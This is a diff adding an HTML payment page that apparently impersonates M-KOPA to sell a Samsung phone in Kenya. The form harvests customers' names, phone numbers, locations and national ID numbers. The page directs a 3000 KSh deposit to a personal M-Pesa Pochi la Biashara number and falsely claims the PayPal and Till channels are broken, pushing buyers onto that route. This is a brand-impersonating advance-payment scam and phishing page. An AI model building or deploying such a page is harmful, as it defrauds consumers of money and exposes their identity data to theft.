@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Page</title>
+    
+    <style>
+        
+        img {
+            width: 200px;
+            height: auto;
+        }
+    </style>
+    
+    <link rel="stylesheet" href="payc.css">
+</head>
+<body>
+
+
+    <div class="container">
+    <img src="mkopa.png" alt="mkopa logo">
+        
+        <p>Deposit 3000ksh Daily payment 55ksh</p>
+    <button>or by ksh16000</button>
+    <h1></h1>
+    
+    <img src="phones/Samsung A14 Za.png" alt="Samsung A14 Za.png logo">
+        
+        <h1>Make a Payment</h1>
+        <form id="payment-form">
+            <label for="card-holder-name">Customer full Names</label>
+            <input type="text" id=" enter your names here" required>
+            
+            <label for="card-number">Your phone Number</label>
+            <input type="text" id="card-number" placeholder="07..." required>
+            
+      
+            
+            <label for="card-number">Enter your county</label>
+            <select name="county">
+    <option value="Baringo">Baringo</option>
+    <option value="Bomet">Bomet</option>
+    <option value="Bungoma">Bungoma</option>
+    <option value="Busia">Busia</option>
+    <option value="Elgeyo Marakwet">Elgeyo Marakwet</option>
+    <option value="Embu">Embu</option>
+    <option value="Garissa">Garissa</option>
+    <option value="Homa Bay">Homa Bay</option>
+    <option value="Isiolo">Isiolo</option>
+    <option value="Kajiado">Kajiado</option>
+    <option value="Kakamega">Kakamega</option>
+    <option value="Kericho">Kericho</option>
+    <option value="Kiambu">Kiambu</option>
+    <option value="Kilifi">Kilifi</option>
+    <option value="Kirinyaga">Kirinyaga</option>
+    <option value="Kisii">Kisii</option>
+    <option value="Kisumu">Kisumu</option>
+    <option value="Kitui">Kitui</option>
+    <option value="Kwale">Kwale</option>
+    <option value="Laikipia">Laikipia</option>
+    <option value="Lamu">Lamu</option>
+    <option value="Machakos">Machakos</option>
+    <option value="Makueni">Makueni</option>
+    <option value="Mandera">Mandera</option>
+    <option value="Marsabit">Marsabit</option>
+    <option value="Meru">Meru</option>
+    <option value="Migori">Migori</option>
+    <option value="Mombasa">Mombasa</option>
+    <option value="Murang'a">Murang'a</option>
+    <option value="Nairobi">Nairobi</option>
+    <option value="Nakuru">Nakuru</option>
+    <option value="Nandi">Nandi</option>
+    <option value="Narok">Narok</option>
+    <option value="Nyamira">Nyamira</option>
+    <option value="Nyandarua">Nyandarua</option>
+    <option value="Nyeri">Nyeri</option>
+    <option value="Samburu">Samburu</option>
+    <option value="Siaya">Siaya</option>
+    <option value="Taita-Taveta">Taita-Taveta</option>
+    <option value="Tana River">Tana River</option>
+    <option value="Tharaka-Nithi">Tharaka-Nithi</option>
+    <option value="Trans Nzoia">Trans Nzoia</option>
+    <option value="Turkana">Turkana</option>
+    <option value="Uasin Gishu">Uasin Gishu</option>
+    <option value="Vihiga">Vihiga</option>
+    <option value="Wajir">Wajir</option>
+    <option value="West Pokot">West Pokot</option>
+</select>
+       
+            <label for="expiry-date">enter your location </label>
+           
+           <input type="text" id="card-number" placeholder="Enter Location" required>
+           
+           
+           
+            
+            <label for="cvc">National ID number</label>
+            <input type="text" id="cvc" placeholder="enter your original id number" required>
+            
+            <label for="card-number">product and model</label>
+            <input type="text" id="card-number" placeholder="Galaxy S22" required readonly>    
+            <p>scroll down to pay your deposit<strong> 3000ksh</strong></p> 
+            <button type="submit" class ="button3">Pay To continue</button>
+            
+            <button type="submit">After you complete your payment return to this page and press "Track your item" to track your delivery and we will also contact you to confirm your location.</button>
+            <p>Your item will be delived within 24 hours</p>
+            
+            <button type="submit" class ="button2">Track Your Item</button>
+            
+        </form>
+        
+        <h>pay via Safaricom pochi la Biashara</h>
+        <img src="pay_photo/lipa.png" alt="payphoto logo">
+        <p>steps:</p>
+        <p>1 go to mpesa menu</p>
+        <p>2 select lipa na mpesa</p>
+        <p>3 select Pochi La Biashara</p>
+        <p>4 Enter phone number 0793036251</p>
+        <p>5 enter amount</p>
+        <p>6 enter your mpesa pin and confirm</p>
+        
+        <button type="submit" class ="button2">pay via paypal</button>
+        <p>note:</p>
+        <p>To all our customer our paypal payment portal have encounter some issues for now, so we strongly do not recomend you to pay via paypal use steps in option 1 instead.</p>
+        <button type="submit">pay via Safaricom Till number</button>
+        <p>note:</p>
+        <p>To all our customer our Safaricom till portal have encounter some issues for now, so we strongly do not recomend you to pay via Safaricom till use steps in option 1 instead.</p>
+        
+        <a href="index.html">RETURN HOME</a>
+        
+        
+        <div id="error-message"></div>
+     <img src="mkop.png" alt="mkopa logo">   
+    </div>
+    
+    <script src="https://js.stripe.com/v3/"></script>
+    <script src="payj.js"></script>
+</body>
+</html>
